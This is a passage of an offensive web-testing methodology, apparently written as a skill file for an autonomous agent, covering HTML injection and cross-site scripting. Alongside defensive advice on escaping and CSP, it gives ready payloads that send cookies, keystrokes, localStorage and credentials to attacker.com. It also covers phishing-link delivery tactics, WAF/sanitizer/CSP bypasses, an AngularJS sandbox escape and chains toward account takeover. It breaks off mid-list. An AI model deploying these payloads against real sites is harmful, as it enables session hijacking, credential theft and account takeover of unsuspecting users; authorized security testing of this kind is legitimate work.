{{ user_input }}  # Jinja2 escapes by default
{{ user_input | safe }}  # Marks as safe (dangerous!)
```

```javascript
// JavaScript: Text content (safe)
element.textContent = userInput;

// JavaScript: innerHTML (dangerous!)
element.innerHTML = userInput;  // Vulnerable!

// JavaScript: Sanitize
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

Server-side protections:
- Input validation (whitelist allowed characters)
- Output encoding (context-aware escaping)
- Content Security Policy (CSP) headers
- Web Application Firewall (WAF) rules

## Quick Reference

### Common Test Payloads

| Payload | Purpose |
|---------|---------|
| `<h1>Test</h1>` | Basic rendering test |
| `<b>Bold</b>` | Simple formatting |
| `<a href="evil.com">Link</a>` | Link injection |
| `<img src=x>` | Image tag test |
| `<div style="color:red">` | Style injection |
| `<form action="evil.com">` | Form hijacking |

### Injection Contexts

| Context | Test Approach |
|---------|---------------|
| URL parameter | `?param=<h1>test</h1>` |
| Form field | POST with HTML payload |
| Cookie value | Inject via document.cookie |
| HTTP header | Inject in Referer/User-Agent |
| File upload | HTML file with malicious content |

### Encoding Types

| Type | Example |
|------|---------|
| URL encoding | `%3Ch1%3E` = `<h1>` |
| HTML entities | `&#60;h1&#62;` = `<h1>` |
| Double encoding | `%253C` = `<` |
| Unicode | `\u003c` = `<` |

## Constraints and Limitations

### Attack Limitations
- Modern browsers may sanitize some injections
- CSP can prevent inline styles and scripts
- WAFs may block common payloads
- Some applications escape output properly

### Testing Considerations
- Distinguish between HTML injection and XSS
- Verify visual impact in browser
- Test in multiple browsers
- Check for stored vs reflected

### Severity Assessment
- Lower severity than XSS (no script execution)
- Higher impact when combined with phishing
- Consider defacement/reputation damage
- Evaluate credential theft potential

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| HTML not rendering | Check if output HTML-encoded; try encoding variations; verify HTML context |
| Payload stripped | Use encoding variations; try tag splitting; test null bytes; nested tags |
| XSS not working (HTML only) | JS filtered but HTML allowed; leverage phishing forms, meta refresh redirects |


---

## [XSS + HTML Injection (zebbern)] Additional Techniques

# Cross-Site Scripting and HTML Injection Testing

## Purpose

Execute comprehensive client-side injection vulnerability assessments on web applications to identify XSS and HTML injection flaws, demonstrate exploitation techniques for session hijacking and credential theft, and validate input sanitization and output encoding mechanisms. This skill enables systematic detection and exploitation across stored, reflected, and DOM-based attack vectors.

## Inputs / Prerequisites

### Required Access
- Target web application URL with user input fields
- Burp Suite or browser developer tools for request analysis
- Access to create test accounts for stored XSS testing
- Browser with JavaScript console enabled

### Technical Requirements
- Understanding of JavaScript execution in browser context
- Knowledge of HTML DOM structure and manipulation
- Familiarity with HTTP request/response headers
- Understanding of cookie attributes and session management

### Legal Prerequisites
- Written authorization for security testing
- Defined scope including target domains and features
- Agreement on handling of any captured session data
- Incident response procedures established

## Outputs / Deliverables

- XSS/HTMLi vulnerability report with severity classifications
- Proof-of-concept payloads demonstrating impact
- Session hijacking demonstrations (controlled environment)
- Remediation recommendations with CSP configurations

## Core Workflow

### Phase 1: Vulnerability Detection

#### Identify Input Reflection Points
Locate areas where user input is reflected in responses:

```
# Common injection vectors
- Search boxes and query parameters
- User profile fields (name, bio, comments)
- URL fragments and hash values
- Error messages displaying user input
- Form fields with client-side validation only
- Hidden form fields and parameters
- HTTP headers (User-Agent, Referer)
```

#### Basic Detection Testing
Insert test strings to observe application behavior:

```html
<!-- Basic reflection test -->
<test123>

<!-- Script tag test -->
<script>alert('XSS')</script>

<!-- Event handler test -->
<img src=x onerror=alert('XSS')>

<!-- SVG-based test -->
<svg onload=alert('XSS')>

<!-- Body event test -->
<body onload=alert('XSS')>
```

Monitor for:
- Raw HTML reflection without encoding
- Partial encoding (some characters escaped)
- JavaScript execution in browser console
- DOM modifications visible in inspector

#### Determine XSS Type

**Stored XSS Indicators:**
- Input persists after page refresh
- Other users see injected content
- Content stored in database/filesystem

**Reflected XSS Indicators:**
- Input appears only in current response
- Requires victim to click crafted URL
- No persistence across sessions

**DOM-Based XSS Indicators:**
- Input processed by client-side JavaScript
- Server response doesn't contain payload
- Exploitation occurs entirely in browser

### Phase 2: Stored XSS Exploitation

#### Identify Storage Locations
Target areas with persistent user content:

```
- Comment sections and forums
- User profile fields (display name, bio, location)
- Product reviews and ratings
- Private messages and chat systems
- File upload metadata (filename, description)
- Configuration settings and preferences
```

#### Craft Persistent Payloads

```html
<!-- Cookie stealing payload -->
<script>
document.location='http://attacker.com/steal?c='+document.cookie
</script>

<!-- Keylogger injection -->
<script>
document.onkeypress=function(e){
  new Image().src='http://attacker.com/log?k='+e.key;
}
</script>

<!-- Session hijacking -->
<script>
fetch('http://attacker.com/capture',{
  method:'POST',
  body:JSON.stringify({cookies:document.cookie,url:location.href})
})
</script>

<!-- Phishing form injection -->
<div id="login">
<h2>Session Expired - Please Login</h2>
<form action="http://attacker.com/phish" method="POST">
Username: <input name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</div>
```

### Phase 3: Reflected XSS Exploitation

#### Construct Malicious URLs
Build URLs containing XSS payloads:

```
# Basic reflected payload
https://target.com/search?q=<script>alert(document.domain)</script>

# URL-encoded payload
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Event handler in parameter
https://target.com/page?name="><img src=x onerror=alert(1)>

# Fragment-based (for DOM XSS)
https://target.com/page#<script>alert(1)</script>
```

#### Delivery Methods
Techniques for delivering reflected XSS to victims:

```
1. Phishing emails with crafted links
2. Social media message distribution
3. URL shorteners to obscure payload
4. QR codes encoding malicious URLs
5. Redirect chains through trusted domains
```

### Phase 4: DOM-Based XSS Exploitation

#### Identify Vulnerable Sinks
Locate JavaScript functions that process user input:

```javascript
// Dangerous sinks
document.write()
document.writeln()
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()
eval()
setTimeout()
setInterval()
Function()
location.href
location.assign()
location.replace()
```

#### Identify Sources
Locate where user-controlled data enters the application:

```javascript
// User-controllable sources
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage data
localStorage/sessionStorage
```

#### DOM XSS Payloads

```javascript
// Hash-based injection
https://target.com/page#<img src=x onerror=alert(1)>

// URL parameter injection (processed client-side)
https://target.com/page?default=<script>alert(1)</script>

// PostMessage exploitation
// On attacker page:
<iframe src="https://target.com/vulnerable"></iframe>
<script>
frames[0].postMessage('<img src=x onerror=alert(1)>','*');
</script>
```

### Phase 5: HTML Injection Techniques

#### Reflected HTML Injection
Modify page appearance without JavaScript:

```html
<!-- Content injection -->
<h1>SITE HACKED</h1>

<!-- Form hijacking -->
<form action="http://attacker.com/capture">
<input name="credentials" placeholder="Enter password">
<button>Submit</button>
</form>

<!-- CSS injection for data exfiltration -->
<style>
input[value^="a"]{background:url(http://attacker.com/a)}
input[value^="b"]{background:url(http://attacker.com/b)}
</style>

<!-- iframe injection -->
<iframe src="http://attacker.com/phishing" style="position:absolute;top:0;left:0;width:100%;height:100%"></iframe>
```

#### Stored HTML Injection
Persistent content manipulation:

```html
<!-- Marquee disruption -->
<marquee>Important Security Notice: Your account is compromised!</marquee>

<!-- Style override -->
<style>body{background:red !important;}</style>

<!-- Hidden content with CSS -->
<div style="position:fixed;top:0;left:0;width:100%;background:white;z-index:9999;">
Fake login form or misleading content here
</div>
```

### Phase 6: Filter Bypass Techniques

#### Tag and Attribute Variations

```html
<!-- Case variation -->
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>

<!-- Alternative tags -->
<svg/onload=alert(1)>
<body/onload=alert(1)>
<marquee/onstart=alert(1)>
<details/open/ontoggle=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- Malformed tags -->
<img src=x onerror=alert(1)//
<img """><script>alert(1)</script>">
```

#### Encoding Bypass

```html
<!-- HTML entity encoding -->
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>

<!-- Hex encoding -->
<img src=x onerror=&#x61;&#x6c;&#x65;&#x72;&#x74;(1)>

<!-- Unicode encoding -->
<script>\u0061lert(1)</script>

<!-- Mixed encoding -->
<img src=x onerror=\u0061\u006cert(1)>
```

#### JavaScript Obfuscation

```javascript
// String concatenation
<script>eval('al'+'ert(1)')</script>

// Template literals
<script>alert`1`</script>

// Constructor execution
<script>[].constructor.constructor('alert(1)')()</script>

// Base64 encoding
<script>eval(atob('YWxlcnQoMSk='))</script>

// Without parentheses
<script>alert`1`</script>
<script>throw/a]a]/.source+onerror=alert</script>
```

#### Whitespace and Comment Bypass

```html
<!-- Tab/newline insertion -->
<img src=x	onerror
=alert(1)>

<!-- JavaScript comments -->
<script>/**/alert(1)/**/</script>

<!-- HTML comments in attributes -->
<img src=x onerror="alert(1)"<!--comment-->
```

## Quick Reference

### XSS Detection Checklist
```
1. Insert <script>alert(1)</script> â†’ Check execution
2. Insert <img src=x onerror=alert(1)> â†’ Check event handler
3. Insert "><script>alert(1)</script> â†’ Test attribute escape
4. Insert javascript:alert(1) â†’ Test href/src attributes
5. Check URL hash handling â†’ DOM XSS potential
```

### Common XSS Payloads

| Context | Payload |
|---------|---------|
| HTML body | `<script>alert(1)</script>` |
| HTML attribute | `"><script>alert(1)</script>` |
| JavaScript string | `';alert(1)//` |
| JavaScript template | `${alert(1)}` |
| URL attribute | `javascript:alert(1)` |
| CSS context | `</style><script>alert(1)</script>` |
| SVG context | `<svg onload=alert(1)>` |

### Cookie Theft Payload
```javascript
<script>
new Image().src='http://attacker.com/c='+btoa(document.cookie);
</script>
```

### Session Hijacking Template
```javascript
<script>
fetch('https://attacker.com/log',{
  method:'POST',
  mode:'no-cors',
  body:JSON.stringify({
    cookies:document.cookie,
    localStorage:JSON.stringify(localStorage),
    url:location.href
  })
});
</script>
```

## Constraints and Guardrails

### Operational Boundaries
- Never inject payloads that could damage production systems
- Limit cookie/session capture to demonstration purposes only
- Avoid payloads that could spread to unintended users (worm behavior)
- Do not exfiltrate real user data beyond scope requirements

### Technical Limitations
- Content Security Policy (CSP) may block inline scripts
- HttpOnly cookies prevent JavaScript access
- SameSite cookie attributes limit cross-origin attacks
- Modern frameworks often auto-escape outputs

### Legal and Ethical Requirements
- Written authorization required before testing
- Report critical XSS vulnerabilities immediately
- Handle captured credentials per data protection agreements
- Do not use discovered vulnerabilities for unauthorized access

## Examples

### Example 1: Stored XSS in Comment Section

**Scenario**: Blog comment feature vulnerable to stored XSS

**Detection**:
```
POST /api/comments
Content-Type: application/json

{"body": "<script>alert('XSS')</script>", "postId": 123}
```

**Observation**: Comment renders and script executes for all viewers

**Exploitation Payload**:
```html
<script>
var i = new Image();
i.src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(document.cookie);
</script>
```

**Result**: Every user viewing the comment has their session cookie sent to attacker's server.

### Example 2: Reflected XSS via Search Parameter

**Scenario**: Search results page reflects query without encoding

**Vulnerable URL**:
```
https://shop.example.com/search?q=test
```

**Detection Test**:
```
https://shop.example.com/search?q=<script>alert(document.domain)</script>
```

**Crafted Attack URL**:
```
https://shop.example.com/search?q=%3Cimg%20src=x%20onerror=%22fetch('https://attacker.com/log?c='+document.cookie)%22%3E
```

**Delivery**: URL sent via phishing email to target user.

### Example 3: DOM-Based XSS via Hash Fragment

**Scenario**: JavaScript reads URL hash and inserts into DOM

**Vulnerable Code**:
```javascript
document.getElementById('welcome').innerHTML = 'Hello, ' + location.hash.slice(1);
```

**Attack URL**:
```
https://app.example.com/dashboard#<img src=x onerror=alert(document.cookie)>
```

**Result**: Script executes entirely client-side; payload never touches server.

### Example 4: CSP Bypass via JSONP Endpoint

**Scenario**: Site has CSP but allows trusted CDN

**CSP Header**:
```
Content-Security-Policy: script-src 'self' https://cdn.trusted.com
```

**Bypass**: Find JSONP endpoint on trusted domain:
```html
<script src="https://cdn.trusted.com/api/jsonp?callback=alert"></script>
```

**Result**: CSP bypassed using allowed script source.

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Script not executing | Check CSP blocking; verify encoding; try event handlers (img, svg onerror); confirm JS enabled |
| Payload appears but doesn't execute | Break out of attribute context with `"` or `'`; check if inside comment; test different contexts |
| Cookies not accessible | Check HttpOnly flag; try localStorage/sessionStorage; use no-cors mode |
| CSP blocking payloads | Find JSONP on whitelisted domains; check for unsafe-inline; test base-uri bypass |
| WAF blocking requests | Use encoding variations; fragment payload; null bytes; case variations |


---

## hunt-xss — Hunting Methodology (real BB reports)

## Autonomous Testing Priority

**Verify reflection before claiming XSS — encoding is everything.**

Your payload must appear in the response body with angle brackets UNESCAPED. `<script>` is XSS. `&lt;script&gt;` is safe encoding — not vulnerable.

**Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `<script>alert(91234)</script>` or `"><img src=x onerror=alert(91234)>`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert('XSS')` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page's decoy examples. Proof = your `alert(<canary>)` shows up in the response with raw, unescaped angle brackets.

**Try these contexts in order:**

1. **Inline script injection** (works when HTML context allows new tags):
   ```
   <script>alert(CANARY)</script>
   ```
   Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.

2. **Attribute event injection** (when `<` is filtered but attributes are injectable):
   ```
   " onmouseover="alert(CANARY)
   " onerror="alert(CANARY)
   " onload="alert(CANARY)
   ```

3. **URL/href context:**
   ```
   javascript:alert(CANARY)
   ```

**Distinguishing success from failure:**
- **Vulnerable:** response contains `<script>alert(` unescaped — browser would execute it
- **Filtered/safe:** response contains `&lt;script&gt;` or `&#x3C;script&#x3E;` — properly encoded
- **Blocked:** response is an error, or the reflected value is absent entirely

**For stored XSS:** inject into a field that other pages display (comments, usernames, ticket titles). Then fetch the rendering page and check for unescaped payload. The payload executes when any user views that page — higher severity than reflected.

---

## Crown Jewel Targets

XSS is high-value when it combines **privileged context + persistent delivery + scope escalation**. The highest payouts come from:

- **Admin panels and authenticated dashboards** (e.g., `*/admin`, `*/settings`) — attacker can hijack sessions with elevated privileges, exfiltrate tokens, or pivot to account takeover
- **Payment/financial flows** (`paypal.com`, checkout pages, currency converters) — XSS here enables credential harvesting and financial fraud at scale
- **Stored XSS in collaborative features** (wikis, markdown renderers, issue trackers, RDoc, labels, tags) — one payload infects every viewer, multiplying impact
- **SSO/signin pages** (e.g., `paypal.com/signin`) — XSS here is critical because it can steal auth tokens across the entire platform
- **Shared SaaS tenant surfaces** (`*.myshopify.com`, `api.collabs.*`) — XSS in one tenant's context can bleed across tenant boundaries
- **Help/documentation sites** (`help.shopify.com`) — lower severity individually, but often have looser sanitization and trusted user perception
- **SVG/file upload endpoints** — frequently bypasses CSP and sanitization simultaneously

**Asset types that pay most:** Main product domains > Admin subdomains > API endpoints > Marketing/help sites

---

## OOB-Or-It-Didn't-Happen Gate (Blind / Stored XSS)

For blind and stored XSS — claims require an out-of-band confirmation, the same as blind SSRF. The OOB receiver fires when the payload actually executes in a browser somewhere (an admin reviewing logs, a SOC analyst opening a ticket, an email rendering a stored payload).

### What is NOT confirmation

- ASP.NET request validator rejected your `<` and returned a different status code → not XSS, that's WAF noise.
- Your payload appears in the response body URL-encoded or HTML-encoded → not XSS, that's correct output encoding.
- The form action attribute contains your payload string as `%22onclick%3D…` → not XSS, the browser does NOT decode URL encoding inside HTML attribute values; the `%22` stays as literal `%22` in the DOM.
- Your `<script>` tag appears in the response as `&lt;script&gt;` → not XSS, that's escaping.

### What IS confirmation

- A request to your unique Collaborator subdomain (e.g., `bxss-err-<random>.<collab>.oastify.com`) arrives in the OOB listener after your payload was stored / reflected / queued.
- For stored XSS: the request arrives **hours or days later** when an admin views the affected resource. Plant payloads early in the engagement and keep the listener open.
- The User-Agent of the firing request is a browser (Mozilla/Chrome), not the server's own backend HTTP client.

### Where to plant blind-XSS beacons

Any field whose value might be viewed in an admin UI / log viewer / email / report later:
- Error messages (`?ErrorMessage=<svg onload=fetch('//bxss-<tag>.<collab>/x')>`)
- Auth-flow source params (`?Source=`, `?ReturnUrl=`)
- Login form username field (admin may view audit logs of failed logins)
- User-Agent header (some SOC consoles render UA as HTML)
- Referer header (some analytics dashboards render Referer as HTML)
- Email addresses on registration / contact forms
- File-upload filenames

**Always sub-tag the Collaborator subdomain by sink** so callbacks identify which field fired.

**Lesson from a authorized engagement:** 10 blind-XSS Collaborator beacons planted across `ErrorMessage`, `Source`, the Authentication.asmx username field, User-Agent header, Referer header, and request paths. Zero callbacks over a 10-minute polling window. Conclusion: the SharePoint SOC views logs / errors in tooling that does not render HTML, AND the ASP.NET request validator blocks `<` in query strings before the payload reaches storage. Stored-XSS claim correctly retracted.

---

## Attack Surface Signals

**URL Patterns:**
```
/admin*
/settings*
/wiki*
/reports*
?utm_source=
?redirect=
?q=
?search=
?callback=
?return_url=
/render*
/preview*
/documentation*
```

**Response Headers (weak defense signals):**
```
Content-Type: text/html (without nosniff)
Content-Security-Policy: (absent or using unsafe-inline)
Content-Type: image/svg+xml (CSP often not applied)
X-XSS-Protection: 0
```

**JS Patterns in source that signal DOM XSS:**
```javascript
document.write(
innerHTML =
location.hash
location.search
location.href
document.referrer
eval(
setTimeout(string,
setInterval(string,
$.html(
$(location
```

**Tech Stack Signals:**
- Rails applications using `html_safe`, `raw`, `translate`, Action Text, or ActionView sanitize helpers
- GitLab/GitHub markdown pipelines (Banzai, Kramdown, RDoc, Kroki)
- Applications allowing SVG uploads or rendering
- Sites using `style` tag in allowlists
- Kroki/Mermaid/PlantUML diagram rendering endpoints
- Cache layers in front of authenticated pages (cache poisoning vector)

---

## Step-by-Step Hunting Methodology

1. **Map all reflection points** — Spider the target and identify every place user input appears in HTML output. Prioritize: URL parameters, form fields, HTTP headers (User-Agent, Referer), file upload names/contents, and API response fields rendered in UI.

2. **Classify by type** — Determine if each reflection is Reflected (URL param → response), Stored (database → later rendering), or DOM-based (JS reads URL/storage → DOM sink). Each requires different payload delivery.

3. **Probe sanitizer behavior** — Send harmless canary strings first: `aaa"bbb'ccc<ddd` to determine which characters are escaped. Observe if output is in HTML context, attribute context, JS context, or URL context.

   **Marker Discipline:** When choosing canary strings, they MUST be unique random alphanumeric strings (8+ chars, no English words, no protocol keywords). Bad markers: `test`, `marker`, `evil`, `attacker`, `payload`, `javascript`, `script`. Good markers: `cpmark987abc`, `x4hd2k9pq`, `__ZZ_MARKER_<random>_ZZ__`. Before claiming reflection, search the baseline (no-marker) response for the marker — if it appears naturally in the page (e.g., the word `javascript` is in every page's help-link hrefs), it's a false-positive trap and you need a different marker. This single check catches 80% of false-positive reflection reports.

4. **Test allowlisted tag combinations** — If a sanitizer is in use, probe for dangerous tag combos: `<math>+<style>`, `<svg>+<style>`, `<iframe srcdoc>`, `<style>` with expressions.

5. **Hunt SVG and file upload vectors** — Upload SVG files containing `<script>` tags. Check Content-Type response header. Test if CSP applies to SVG responses separately.

6. **Test markdown/documentation renderers** — In wiki, README, or doc fields, try: `[text](javascript:alert(1))`, inline HTML injection, Kroki/Mermaid payloads, RDoc `link:javascript:` syntax.

7. **Check redirect parameters** — Test `?redirect=javascript:alert(1)` and `?return_url=//evil.com` — look for single-click XSS via improper redirect sanitization.

8. **Probe UTM and analytics parameters** — `utm_source`, `utm_medium`, `utm_campaign` are often reflected without sanitization on marketing pages.

9. **Test CSP bypass opportunities** — If CSP is present, look for: JSONP endpoints on allowed domains, `unsafe-inline` in style-src, SVG that bypasses script-src, script gadgets on whitelisted CDNs.

10. **Attempt stored XSS in profile/metadata fields** — Username, bio, tag names, label colors, organization names — these render in many contexts and often have weaker validation.

11. **Check cache poisoning** — Test if reflected XSS payloads can be cached and served to other users (especially on CDN-fronted pages), transforming reflected XSS into stored-equivalent.

12. **Validate in target browser** — Always confirm in a real browser before reporting. Many payloads echo back in Burp but fail to execute in a real browser due to CSP, output encoding, framework auto-escaping, context mismatch, WAF normalization, or browser HTML-parsing differences. (Note: Chrome's XSS Auditor was removed in Chrome 78 / Oct 2019 and no shipping browser has one — never attribute a failed PoC to an "XSS auditor".)

---

## Payload & Detection Patterns

**Basic context probing:**
```html
aaa"bbb'ccc<ddd>eee`fff
```

**Reflected XSS — URL parameter baseline:**
```
?q=<script>alert(document.domain)</script>
?q="><script>alert(1)</script>
?utm_source=<svg onload=alert(1)>
?redirect=javascript:alert(document.domain)
```

**Attribute context escapes:**
```html
" onmouseover="alert(1)
' onmouseover='alert(1)
`onmouseover=alert(1)
```

**SVG-based (CSP bypass):**
```html
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.domain)</script>
</svg>
```

**Sanitizer bypass — math+style combo:**
```html
<math><style><img src=x onerror=alert(1)></style></math>
```

**Sanitizer bypass — svg+style combo:**
```html
<svg><style><img src=x onerror=alert(1)></style></svg>
```

**Markdown/RDoc javascript: link:**
```markdown
[Click me](javascript:alert(document.domain))
```

**Kroki/diagram injection:**
```
```kroki
plantuml
@startuml
:<script>alert(1)</script>;
@enduml
```
```

**DOM XSS via hash/search:**
```javascript
// In browser console to test sink
location.hash = '#"><img src=x onerror=alert(1)>'
location.href = 'https://target.com/page#<script>alert(1)</script>'
```

**Grep patterns for source review:**
```bash
# Find dangerous sinks in JS
grep -rn "innerHTML\|document\.write\|eval(\|setTimeout(\|location\.hash\|location\.search" --include="*.js"

# Find unsafe Rails helpers
grep -rn "html_safe\|raw(\|sanitize\|translate" --include="*.erb" --include="*.rb"

# Find reflected params in responses
grep -i "utm_source\|utm_medium\|redirect\|return_url\|callback\|next" --include="*.html" -r
```

**Curl to detect reflection:**
```bash
curl -sk "https://target.com/search?q=XSSCANARY" | grep -i "XSSCANARY"
curl -sk "https://target.com/page?utm_source=XSSCANARY" | grep -i "XSSCANARY"
```

**Cache poisoning test:**
```bash
# Send payload then fetch with clean session to see if cached
curl -sk "https://target.com/page?param=<script>alert(1)</script>" -H "X-Forwarded-Host: evil.com"
curl -sk "https://target.com/page" | grep -i "evil.com"
```

---

## Common Root Causes

1. **Trusting `html_safe` in Rails** — Developers mark strings as safe after partial sanitization, or chain `.html_safe` on user-supplied data without full sanitization.

2. **Allowlist sanitizers with dangerous tag combinations** — Allowing `style` alongside `math` or `svg` creates mXSS (mutation XSS) opportunities even when individual tags seem harmless.

3. **Third-party rendering pipelines** — Markdown-to-HTML pipelines (Banzai, Kramdown, Kroki) introduce XSS when diagram/rendering engines aren't sandboxed and output isn't re-sanitized.

4. **Reflecting URL parameters without encoding** — UTM params, redirect URLs, and search terms are reflected in page HTML or JS without proper HTML-encoding, especially on marketing/help pages that are treated as lower-security.

5. **SVG treated as non-script content** — Developers apply CSP to HTML responses but forget that `image/svg+xml` responses can execute JavaScript and often aren't covered by the same CSP header.

6. **Incomplete sanitizer patches** — CVE-patched sanitizers are bypassed by slight variations (e.g., CVE-2022-32209's incomplete fix demonstrates that sanitizer logic is difficult to get right, creating bypass chains).

7. **`javascript:` scheme not blocked in href/src** — Link renderers (RDoc, Markdown) fail to block `javascript:` URLs in href attributes, treating them as valid external links.

8. **Cache layers storing authenticated user input** — CDN or reverse proxy caches store responses containing user-controlled XSS payloads, serving them to subsequent unauthenticated users.

9. **File upload without Content-Type enforcement** — Accepting SVG or HTML files and serving them without forcing `Content-Disposition: attachment` or overriding Content-Type.

10. **Translation helper XSS** — Rails `translate`/`t()` helper marks translation strings as HTML-safe and interpolates user input, enabling injection through locale keys.

---

## Bypass Techniques

**CSP Bypass:**
- SVG uploads bypass script-src because `image/svg+xml` responses may not inherit the page's CSP
- Find JSONP endpoints on whitelisted domains (`*.googleapis.com`, `*.cloudflare.com`)
- Use `<base>` tag injection to redirect script sources
- Exploit `unsafe-eval` or `unsafe-inline` in style-src to execute CSS-based attacks
- `<link rel=preload>` or `<meta http-equiv>` gadgets to bypass strict policies

**Sanitizer Bypasses:**
- **mXSS (Mutation XSS):** Inject HTML that's safe when parsed by sanitizer but mutates when re-parsed by browser (e.g., `<math><style><img onerror=...>`)
- **Tag combination attacks:** `<svg>` + `<style>` or `<math>` + `<style>` create parsing ambiguity
- **Attribute quoting variations:** `onmouseover=alert(1)` without quotes, backtick delimiters
- **HTML entity encoding:** `&#106;avascript:` or `&#x6A;avascript:` in href values
- **Protocol variations:** `javascript:`, `vbscript:`, `data:text/html`

**Filter Evasion:**
```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<!-- Null bytes (legacy/weak — null bytes rarely survive modern HTTP/HTML parsing; low success, don't rely on it) -->
<scr\x00ipt>alert(1)</scr\x00ipt>
<!-- Tag breaking -->
<svg/onload=alert(1)>
<!-- Event handler alternatives -->
<body onpageshow=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
```

**WAF Bypass:**
```javascript
// Obfuscated payloads
<svg onload=eval(atob('YWxlcnQoMSk='))>
// String splitting
<script>ale\u0072t(1)</script>
// HTML5 event handlers that WAFs miss
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

**Redirect-based XSS bypass:**
```
?next=javascript://%0aalert(1)
?next=javascript&colon;alert(1)
?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
```

**AngularJS client-side template injection (CSTI) & sandbox escapes:**
- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes, `angular.js`/`angular.min.js`, or `{{ }}` interpolation). Probe a reflected param with `{{7*7}}` — if it renders `49` (not the literal text), the value is evaluated as an Angular expression. Always drive the `browser` tool so the expression actually evaluates.
- *Execute JS by escaping the sandbox* (technique depends on the AngularJS version):
  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.
  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all. Payload structure (fill in the placeholders yourself):
    ```
    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1
    ```
    - `PARAM` = the reflected parameter you found.
    - `CODES` = the comma-separated character codes of the JavaScript you want to run — **compute these yourself** (e.g. encode `x=alert(1)` by converting each character to its char code). `toString()` produces a string without quotes; `[].join` replaces `charAt`; `orderBy` invokes the filter; `fromCharCode(CODES)` rebuilds your payload from the codes.
- Applies to **legacy AngularJS (<1.6)** only; modern frameworks (Angular 2+, React, Vue) are not affected.

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   The attacker must demonstrate a concrete action: execute JavaScript in victim's browser session on the target domain, steal session cookies/tokens, perform actions as the victim, or exfiltrate sensitive data. "Alert box appears" is not sufficient — state what the alert box *represents* in terms of access (e.g., "I can read `document.cookie` which contains the auth token used for all admin API calls").

2. **What does the victim LOSE?**
   The victim must lose something real: session control (account takeover), sensitive data (cookies, CSRF tokens, PII), money (financial action performed without consent), or trust (credential phishing via DOM manipulation). If the victim is an unauthenticated user on a public page with no session, quantify what *that* user's browser is exposed to.

3. **Can it be reproduced in 10 minutes from scratch?**
   You must have a self-contained PoC URL or step sequence that any reviewer can follow without prior setup. The payload must fire in a current browser (Chrome/Firefox latest) without special configuration. If it only works in outdated browsers or requires the victim to have a specific extension installed, it likely won't be accepted.

---

## Real Impact Examples

**Scenario 1 — Stored XSS via Cache Poisoning on Sign-In Page**
An attacker discovered that a major payment platform's sign-in page reflected user-controlled input and was cached by the CDN layer. By sending a crafted request that poisoned the cache, the attacker transformed a reflected XSS into a stored-equivalent that fired for every user visiting the login page. Impact: mass credential harvesting at scale — every user who visited the sign-in page would have their credentials captured. The bypassed CSP made remediation require both code fixes and cache purging.

**Scenario 2 — Stored XSS via Diagram Rendering in Wiki**
A developer platform's wiki feature integrated a third-party diagram rendering service (Kroki). An attacker crafted a malicious diagram payload that, when rendered, executed arbitrary JavaScript in the context of any user viewing the wiki page. Because wikis are shared across team members including project owners and admins, the payload could silently exfiltrate OAuth tokens and perform administrative actions on behalf of every viewer — effectively achieving organization-level account takeover from a single stored payload.

**Scenario 3 — Sanitizer Bypass via Label Color Field with CSP Bypass**
A project management platform patched an XSS vulnerability in label color fields but the fix was incomplete. A researcher found that by combining the `style` tag allowlist with specific tag nesting (`svg>style`), the sanitizer's output mutated when parsed by the browser, executing injected JavaScript. The payload also bypassed the platform's Content Security Policy because the injection occurred in an allowlisted inline style context. Impact: any user with label-creation permissions (often all project members) could inject persistent XSS that triggered for every project visitor, enabling cross-user session theft within the same project namespace.

---

## Chains & Compositions (Senior Hunting)

XSS as a standalone finding gets paid at Low-Medium on mature programs. Real payouts cluster around chains that convert JS execution into account takeover, mass-victim impact, CSP bypass, or token exfil. The composition skill is *"what does my XSS unlock once it executes?"* — and the answer is always something beyond `alert(1)`.

### Chain 1 — Reflected XSS + Cache Poisoning → Persistent Stored XSS at CDN Scale (Kettle-class)

- **A.** Identify a reflected XSS where the vulnerable input lands in the response body and the response is cacheable (`Cache-Control: public, max-age=…`).
- **B.** Identify an unkeyed input that influences the cached body — typically `X-Forwarded-Host`, `X-Original-URL`, an unkeyed cookie, or a parameter stripped from the cache key but reflected in the body.
- **C.** Send a single request with the XSS payload via the unkeyed input. Cache stores the poisoned response. Every subsequent CDN-edge visitor receives it for the full TTL.
- **Impact:** Self-inflicted reflected XSS becomes persistent stored XSS affecting every visitor in the affected geo until cache expires. No per-victim interaction required.
- **Real shape:** Glassdoor reflected→stored XSS via cache poisoning, H1 #1424094 (2021-2022); Kettle "Practical Web Cache Poisoning" research. Cross-refs `hunt-cache-poison` Disclosed Report Citation #4.

### Chain 2 — Self-XSS + CSRF Trigger → Effective Stored XSS → ATO

- **A.** Confirm self-XSS in a profile field (`bio`, `display_name`, `signature`) — payload only executes when the same logged-in user views their own profile.
- **B.** Find a CSRF-vulnerable endpoint that mutates that field (no anti-CSRF token, or `text/plain` enctype bypass).
